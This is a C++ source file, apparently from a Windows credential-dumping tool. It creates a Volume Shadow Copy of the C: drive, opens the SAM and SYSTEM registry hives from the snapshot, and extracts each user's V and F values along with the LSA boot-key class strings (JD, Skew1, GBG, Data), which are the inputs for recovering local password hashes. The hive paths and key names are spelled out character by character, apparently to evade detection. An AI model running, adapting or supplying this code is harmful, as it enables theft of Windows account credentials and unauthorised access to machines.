// Peter Gabaldon. https://pgj11.com/.
// Perform a Shadow Snapshot to read SAM and SYSTEM
// from this newly created SS instead of reading them from the registry

// Using Offline Registry library, Offreg.dll, for parsing the Registry from the REGF-formatted SAM and SYSTEM files

// https://github.com/microsoft/Windows-classic-samples/blob/main/Samples/Win7Samples/winbase/vss/vshadow/shadow.cpp
// https://github.com/PeterUpfold/ShadowDuplicator
// https://learn.microsoft.com/en-us/windows/win32/vss/volume-shadow-copy-reference
// 
// Special mention to ShadowDuplicator from Peter Upfold because I took some much code from it to implement the shadow copy method and get SYSTEM and SAM from it
// https://github.com/PeterUpfold
// 

#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>

#include "include/shadowMethod.h"
#include "include/ntdll.h"
#include "include/offreg.h"

static HRESULT WaitAndReleaseVssAsync(IVssAsync** vssAsync) {
	if (vssAsync == NULL || *vssAsync == NULL) {
		return E_POINTER;
	}

	HRESULT result = S_OK;
	HRESULT asyncResult = VSS_S_ASYNC_PENDING;

	while (asyncResult == VSS_S_ASYNC_PENDING) {
		Sleep(SLEEP_VSS_SYNC);
		result = (*vssAsync)->QueryStatus(&asyncResult, NULL);
		if (FAILED(result)) {
			break;
		}
	}

	(*vssAsync)->Release();
	*vssAsync = NULL;

	if (FAILED(result)) {
		return result;
	}

	if (asyncResult == VSS_S_ASYNC_FINISHED) {
		return S_OK;
	}

	if (asyncResult == VSS_S_ASYNC_CANCELLED) {
		return HRESULT_FROM_WIN32(ERROR_CANCELLED);
	}

	return asyncResult;
}

BOOL createSS(WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)], WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)]) {
	HRESULT result = E_FAIL;
	int strResult;
	BOOL success = FALSE;
	BOOL comInitialized = FALSE;
	BOOL snapshotPropInitialized = FALSE;
	IVssBackupComponents* backupComponents = NULL;
	IVssAsync* vssAsync = NULL;
	VSS_ID snapshotSetId = GUID_NULL;
	VSS_ID snapshotId = GUID_NULL;
	VSS_SNAPSHOT_PROP snapshotProp{};
	WCHAR auxSAM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'A',L'M', L'\0' };
	WCHAR auxSYSTEM[] = { L'W',L'i',L'n',L'd',L'o',L'w',L's',L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',L'\\',L'C',L'o',L'n',L'f',L'i',L'g',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M', L'\0' };

	// For now, we presuppose C:

	// Not necessary right now. Later, when using args is better to use GetVolumePathNameW(); before GetVolumeNameForVolumeMountPointW

	WCHAR volumeName[MAX_PATH] = {};
	if (!GetVolumeNameForVolumeMountPointW(L"C:\\", volumeName, MAX_PATH)) {
		return FALSE;
	}

	// Init COM
	result = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	if (FAILED(result)) {
		goto cleanup;
	}
	comInitialized = TRUE;

	result = CreateVssBackupComponents(&backupComponents);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->InitializeForBackup();

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->SetContext(VSS_CTX_CLIENT_ACCESSIBLE);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->StartSnapshotSet(&snapshotSetId);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->AddToSnapshotSet(volumeName, GUID_NULL, &snapshotId);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->DoSnapshotSet(&vssAsync);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = WaitAndReleaseVssAsync(&vssAsync);

	if (FAILED(result)) {
		goto cleanup;
	}

	result = backupComponents->GetSnapshotProperties(snapshotId, &snapshotProp);

	if (FAILED(result)) {
		goto cleanup;
	}
	snapshotPropInitialized = TRUE;

	// Perform the copy from SS

	// SAM
	strResult = swprintf(sourcePathFileSAM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSAM);
	if (strResult < 0) {
		goto cleanup;
	}
	// SYSTEM
	strResult = swprintf(sourcePathFileSYSTEM, MAX_PATH * sizeof(WCHAR), L"%s\\%s", snapshotProp.m_pwszSnapshotDeviceObject, auxSYSTEM);
	if (strResult < 0) {
		goto cleanup;
	}

	success = TRUE;

cleanup:
	if (vssAsync != NULL) {
		vssAsync->Release();
		vssAsync = NULL;
	}

	if (snapshotPropInitialized) {
		VssFreeSnapshotProperties(&snapshotProp);
	}

	if (backupComponents != NULL) {
		backupComponents->Release();
		backupComponents = NULL;
	}

	if (comInitialized) {
		CoUninitialize();
	}

	return success;
}

void getSAMfromRegf(PSAM samRegEntries[], PULONG size, WCHAR SAMPath[MAX_PATH], WCHAR SYSTEMPath[MAX_PATH]) {
	ORHKEY subKeyUsers;
	ORHKEY subKeyAccount;
	ORHKEY subKeyUser;
	ULONG lengthBuff;
	DWORD numberSubkeysKey;
	DWORD numberValuesSubkeysV;
	DWORD numberValuesSubkeysF;
	WCHAR nameSubkeyKey[MAX_PATH] = {};
	WCHAR nameValueSubkeyV[MAX_PATH] = {};
	WCHAR nameValueSubkeyF[MAX_PATH] = {};
	DWORD maxLenOfNames;
	ULONG nEntries = 0;
	PSAM sams[MAX_SAM_ENTRIES] = {};
	ORHKEY samHive = NULL;

	// Some funcs need a pointer to a DWORD so cannot use macro
	DWORD lenRead = MAX_PATH;

	DWORD ret;

	ret = OROpenHive(SAMPath, &samHive);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Account\Domains\USers

	ret = OROpenKey(samHive, L"SAM", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Domains", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Account", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyUsers, L"Users", &subKeyUsers);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	// Open SAM\Domains\Account

	ret = OROpenKey(samHive, L"SAM", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Domains", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(subKeyAccount, L"Account", &subKeyAccount);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	ret = ORQueryInfoKey(subKeyUsers, NULL, NULL, &numberSubkeysKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}


	for (ULONG i = 0; i < numberSubkeysKey && i < MAX_SAM_ENTRIES; i++) {
		maxLenOfNames = MAX_KEY_LENGTH;

		lenRead = MAX_PATH;
		ret = OREnumKey(subKeyUsers, i, nameSubkeyKey, &lenRead, NULL, NULL, NULL);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		if (wcsncmp(L"00", nameSubkeyKey, wcslen(L"00")) == 0) {
			ret = OROpenKey(subKeyUsers, nameSubkeyKey, &subKeyUser);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyUser, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysV, NULL, NULL, NULL, NULL);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
			wcscpy_s(sam->rid, MAX_KEY_LENGTH, nameSubkeyKey);

			// TODO
			getClassesfromRegf(sam, SYSTEMPath);

			for (ULONG j = 0; j < numberValuesSubkeysV; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyUser, j, nameValueSubkeyV, &lenRead, NULL, NULL, NULL);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				if (wcsncmp(nameValueSubkeyV, L"V", wcslen(nameValueSubkeyV)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyUser, NULL, nameValueSubkeyV, NULL, sam->v, &lenRead);
					sam->vLen = lenRead;
				}
			}
			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			ret = ORQueryInfoKey(subKeyAccount, NULL, NULL, NULL, NULL, NULL, &numberValuesSubkeysF, NULL, NULL, NULL, NULL);

			if (!NT_SUCCESS(ret)) {
				exit(ret);
			}

			for (ULONG j = 0; j < numberValuesSubkeysF; j++) {
				lenRead = MAX_PATH;
				ret = OREnumValue(subKeyAccount, j, nameValueSubkeyF, &lenRead, NULL, NULL, NULL);

				if (!NT_SUCCESS(ret)) {
					exit(ret);
				}

				if (wcsncmp(nameValueSubkeyF, L"F", wcslen(nameValueSubkeyF)) == 0) {
					lenRead = MAX_KEY_VALUE_LENGTH;
					ret = ORGetValue(subKeyAccount, NULL, nameValueSubkeyF, NULL, sam->f, &lenRead);
					sam->fLen = lenRead;
				}
			}

			sams[nEntries] = sam;
			nEntries++;
			ORCloseKey(subKeyUser);
			ORCloseKey(subKeyAccount);
		}
	}
	ORCloseKey(subKeyUsers);

	ULONG lenRet = nEntries * sizeof(SAM);
	CopyMemory(size, &lenRet, sizeof(ULONG));

	if (samRegEntries != NULL) {
		for (int i = 0; i < nEntries; i++) {
			samRegEntries[i] = sams[i];
			//HeapFree(GetProcessHeap(), 0, sams[i]);
		}
	}

	return;
}

void getClassesfromRegf(PSAM samRegEntry, WCHAR SYSTEMPath[MAX_PATH]) {
	WCHAR sJD[] = { L'J',L'D', L'\0' };
	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };

	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };

	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";
	WCHAR keyClass[MAX_KEY_VALUE_LENGTH] = {};
	ORHKEY systemHive = NULL;

	ORHKEY key;
	ORHKEY subKey;
	DWORD lenRead;

	DWORD ret;

	ret = OROpenHive(SYSTEMPath, &systemHive);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(systemHive, L"ControlSet001", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Control", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	ret = OROpenKey(key, L"Lsa", &key);

	if (!NT_SUCCESS(ret)) {
		exit(ret);
	}

	for (int j = 0; j < 4; j++) {
		WCHAR RegAux[MAX_PATH] = L"\0";

		ret = OROpenKey(key, sAll[j], &subKey);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		lenRead = MAX_KEY_VALUE_LENGTH;
		ret = ORQueryInfoKey(subKey, keyClass, &lenRead, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, keyClass, _TRUNCATE);

		ORCloseKey(key);
	}
	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);

	return;
}
